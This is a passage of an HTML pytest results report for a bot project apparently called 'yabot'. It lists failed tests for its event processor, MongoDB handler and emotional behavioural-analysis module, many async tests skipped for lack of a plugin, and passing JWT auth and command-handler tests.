            <div class="log">self = &lt;test_event_processor.TestEventProcessor object at 0x7d17015ba4b0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_retry_dead_letter_queue_no_handler(self):<br/>        &quot;&quot;&quot;Test retrying dead letter queue with no handler.&quot;&quot;&quot;<br/>        mock_event_bus = Mock(spec=EventBus)<br/>        event_processor = EventProcessor(mock_event_bus)<br/>    <br/>        # Add an event to the dead letter queue<br/>&gt;       event = create_event(<br/>            &quot;unknown_event_type&quot;,<br/>            user_id=&quot;12345&quot;<br/>        )<br/><br/>tests/unit/test_event_processor.py:526: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>event_type = &#x27;unknown_event_type&#x27;, kwargs = {&#x27;user_id&#x27;: &#x27;12345&#x27;}<br/><br/>    def create_event(event_type: str, **kwargs) -&gt; BaseEvent:<br/>        &quot;&quot;&quot;Factory function to create event instances.<br/>    <br/>        Args:<br/>            event_type (str): Type of event to create<br/>            **kwargs: Event-specific parameters<br/>    <br/>        Returns:<br/>            BaseEvent: Created event instance<br/>    <br/>        Raises:<br/>            ValueError: If event_type is not supported<br/>        &quot;&quot;&quot;<br/>        if event_type not in EVENT_MODELS:<br/>&gt;           raise ValueError(f&quot;Unsupported event type: {event_type}&quot;)<br/><span class="error">E           ValueError: Unsupported event type: unknown_event_type</span><br/><br/>src/events/models.py:461: ValueError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/test_mongodb_handler.py::TestMongoDBHandler::test_initialize_collections_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;test_mongodb_handler.TestMongoDBHandler object at 0x7d17015e42c0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_initialize_collections_success(self):<br/>        &quot;&quot;&quot;Test successful collection initialization.&quot;&quot;&quot;<br/>        mock_db = MagicMock()<br/>        mock_users_collection = Mock()<br/>        mock_narrative_collection = Mock()<br/>        mock_items_collection = Mock()<br/>    <br/>        # Set up mock return values for collections<br/>        mock_db.__getitem__.side_effect = [<br/>            mock_users_collection,<br/>            mock_narrative_collection,<br/>            mock_items_collection<br/>        ]<br/>    <br/>        # Mock the index creation methods<br/>        mock_users_collection.create_index = Mock()<br/>        mock_narrative_collection.create_index = Mock()<br/>        mock_items_collection.create_index = Mock()<br/>    <br/>        handler = MongoDBHandler(mock_db)<br/>        result = await handler.initialize_collections()<br/>    <br/>&gt;       assert result is True<br/><span class="error">E       assert False is True</span><br/><br/>tests/unit/test_mongodb_handler.py:78: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.mongodb:mongodb.py:168 Error initializing MongoDB collections: coroutine raised StopIteration<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/emotional/test_behavioral_analysis.py::test_detect_archetype_patterns</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">behavioral_analysis_engine = &lt;src.modules.emotional.behavioral_analysis.BehavioralAnalysisEngine object at 0x7d16f8caf1d0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_detect_archetype_patterns(behavioral_analysis_engine):<br/>        &quot;&quot;&quot;<br/>        Given: A series of user interactions<br/>        When: detect_archetype_patterns is called<br/>        Then: An archetype classification is returned.<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        user_interactions = [<br/>            {&quot;type&quot;: &quot;text&quot;, &quot;content&quot;: &quot;This is a deep thought.&quot;},<br/>            {&quot;type&quot;: &quot;reaction&quot;, &quot;content&quot;: &quot;🤔&quot;}<br/>        ]<br/>    <br/>        # Act<br/>        archetype_classification = await behavioral_analysis_engine.detect_archetype_patterns(user_interactions)<br/>    <br/>        # Assert<br/>&gt;       assert archetype_classification is not None<br/><span class="error">E       assert None is not None</span><br/><br/>tests/unit/emotional/test_behavioral_analysis.py:57: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.modules.emotional.behavioral_analysis:behavioral_analysis.py:148 Error detecting archetype patterns for user [{&#x27;type&#x27;: &#x27;text&#x27;, &#x27;content&#x27;: &#x27;This is a deep thought.&#x27;}, {&#x27;type&#x27;: &#x27;reaction&#x27;, &#x27;content&#x27;: &#x27;🤔&#x27;}]: &#x27;Mock&#x27; object is not subscriptable<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/emotional/test_behavioral_analysis.py::test_calculate_emotional_resonance</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">behavioral_analysis_engine = &lt;src.modules.emotional.behavioral_analysis.BehavioralAnalysisEngine object at 0x7d16f8ebc710&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_calculate_emotional_resonance(behavioral_analysis_engine):<br/>        &quot;&quot;&quot;<br/>        Given: Interaction data with emotional cues<br/>        When: calculate_emotional_resonance is called<br/>        Then: Resonance metrics are returned.<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        interaction_data = {&quot;vulnerability_level&quot;: 0.8, &quot;authenticity&quot;: 0.9}<br/>    <br/>        # Act<br/>        resonance_metrics = await behavioral_analysis_engine.calculate_emotional_resonance(interaction_data)<br/>    <br/>        # Assert<br/>        assert resonance_metrics is not None<br/>&gt;       assert &quot;score&quot; in resonance_metrics<br/><span class="error">E       AssertionError: assert &#x27;score&#x27; in {&#x27;authenticity_score&#x27;: 0.0, &#x27;depth_score&#x27;: 0.0, &#x27;resonance_score&#x27;: 0.0, &#x27;vulnerability_score&#x27;: 0.0}</span><br/><br/>tests/unit/emotional/test_behavioral_analysis.py:76: AssertionError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/unit/emotional/test_behavioral_analysis.py::test_validate_genuine_vulnerability</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">behavioral_analysis_engine = &lt;src.modules.emotional.behavioral_analysis.BehavioralAnalysisEngine object at 0x7d16f8fef2c0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_validate_genuine_vulnerability(behavioral_analysis_engine):<br/>        &quot;&quot;&quot;<br/>        Given: A set of response patterns<br/>        When: validate_genuine_vulnerability is called<br/>        Then: A vulnerability assessment is returned.<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        response_patterns = [{&quot;pattern&quot;: &quot;hesitation&quot;, &quot;value&quot;: True}]<br/>    <br/>        # Act<br/>&gt;       vulnerability_assessment = await behavioral_analysis_engine.validate_genuine_vulnerability(response_patterns)<br/><span class="error">E       AttributeError: &#x27;BehavioralAnalysisEngine&#x27; object has no attribute &#x27;validate_genuine_vulnerability&#x27;</span><br/><br/>tests/unit/emotional/test_behavioral_analysis.py:90: AttributeError<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_database.py::TestDatabaseManager::test_close_all</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_database_manager.py::test_database_manager</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_event_bus_connect_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_event_bus_connect_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_publish_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_publish_redis_failure_queue_locally</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_subscribe</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_close</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_queue_locally</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_bus.py::test_process_local_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_event_processor_start_processing</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_event_processor_stop_processing</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_register_handler</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_handle_subscription_updated</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_handle_user_registered</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_handle_user_deleted</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_handle_besitos_awarded</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_handle_vip_access_granted</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_process_subscription_update</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_process_user_registration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_process_user_deletion</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_process_besitos_award</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_process_vip_access_grant</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_add_to_dead_letter_queue</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_handle_processing_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_health_check</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_event_processor.py::test_create_event_processor</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_mongodb_handler.py::test_initialize_collections</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/test_mongodb_handler.py::test_initialize_collections_error</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/integration/test_app_integration.py::TestBotApplicationIntegration::test_performance_under_load</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_rate_limiting_protection</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_webhook_signature_validation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="skipped results-table-row">
        <tr>
          <td class="col-result">Skipped</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_command_injection_prevention</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">(&#x27;/home/azureuser/repos/yabot/venv/lib/python3.12/site-packages/_pytest/python.py&#x27;, 184, &#x27;Skipped: async def function and no async plugin installed (see warnings)&#x27;)<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_api_server.py::TestAPIServer::test_api_server_initialization</td>
          <td class="col-duration">0.07</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_api_server.py::TestAPIServer::test_health_check_endpoint</td>
          <td class="col-duration">0.02</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_api_server.py::TestAPIServer::test_api_info_endpoint</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_api_server.py::TestAPIServer::test_protected_health_check_without_auth</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_api_server.py::TestAPIServer::test_protected_health_check_with_invalid_auth</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_api_server.py::TestAPIServer::test_get_api_config</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_auth_service.py::TestJWTAuthService::test_create_service_token</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Created JWT token for service  service_name=test-service
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_auth_service.py::TestJWTAuthService::test_create_service_token_requires_service_name</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_auth_service.py::TestJWTAuthService::test_validate_token_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Created JWT token for service  service_name=test-service
2025-09-20 23:09:45 [info     ] Validated JWT token            subject=test-service
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_auth_service.py::TestJWTAuthService::test_validate_token_expired</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [warning  ] JWT token validation failed: Token has expired
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_auth_service.py::TestJWTAuthService::test_get_token_expiration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Created JWT token for service  service_name=test-service
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_auth_service.py::TestJWTAuthService::test_get_token_expiration_invalid_token</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [warning  ] Failed to extract expiration from token error=&quot;Invalid header string: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0x8a in position 0: invalid start byte&quot;
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_handle_start</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Processing /start command
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_handle_menu</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Processing /menu command
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_handle_help</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> ------------------------------Captured stdout call------------------------------ <br/>2025-09-20 23:09:45 [info     ] Processing /help command
<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/test_commands.py::TestCommandHandler::test_handle_unknown</td>
